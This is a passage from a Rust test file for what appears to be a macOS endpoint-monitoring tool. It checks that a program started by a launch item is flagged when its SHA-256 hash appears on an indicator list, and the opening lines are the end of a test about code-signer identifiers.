    std::fs::set_permissions(&runner, std::fs::Permissions::from_mode(0o755)).unwrap();
    e.run();
    assert_eq!(e.rows(&signer), ["apple, identifier com.apple.true"]);
}

#[test]
fn a_program_a_startup_item_runs_whose_hash_is_on_the_list_is_matched() {
    let e = Estate::new("target-indicator");
    let runner = e.shipped("usr/local/bin/runner");
    launch_item(&e.agent("a"), &["/usr/local/bin/runner"]);
    let sha = sha256_of(std::fs::read(&runner).unwrap());
    e.list(&format!(
        r#"[{{"kind": "file:hashes.'SHA-256'", "value": "{sha}"}}]"#
    ));
    e.run();
    assert_eq!(
        e.findings(false),
        [(
            "indicator.match".to_string(),
            "open".to_string(),
            "/usr/local/bin/runner".to_string(),
            format!("[file:hashes.'SHA-256' = '{sha}']")
        )]
    );
}
